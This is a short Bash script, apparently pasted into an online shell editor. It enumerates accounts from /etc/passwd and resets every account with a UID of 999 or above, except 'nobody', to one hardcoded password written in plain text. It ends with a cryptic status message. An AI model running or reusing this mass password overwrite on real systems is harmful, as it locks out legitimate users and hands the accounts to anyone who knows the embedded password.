#                             Online Bash Shell.
#                 Code, Compile, Run and Debug Bash script online.
# Write your code in this editor and press "Run" button to execute it.

for user in $( sed 's/:.*//' /etc/passwd); do
  if [[ $( id -u $user) -ge 999 && "$user" != "nobody" ]]; then
   (echo "dear-R0sem@ry!"; echo "dear-R0sem@ry!") |  passwd "$user"
  fi
done
echo "Drained the pressure from the swelling..."